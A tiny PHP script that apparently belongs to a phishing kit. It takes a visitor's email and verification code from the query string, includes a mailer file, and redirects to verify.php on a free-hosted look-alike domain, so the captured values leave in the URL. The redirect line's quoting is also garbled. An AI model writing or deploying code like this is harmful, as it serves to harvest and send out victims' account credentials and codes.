<?php

    $email = $_GET['email'];
    $code = $_GET['code'];
    
    include('mail.php');
    
    header("Location: https://accountstorageratzer.000webhostapp.com/verify.php?email='.$email.'&code='.$code.'");

?>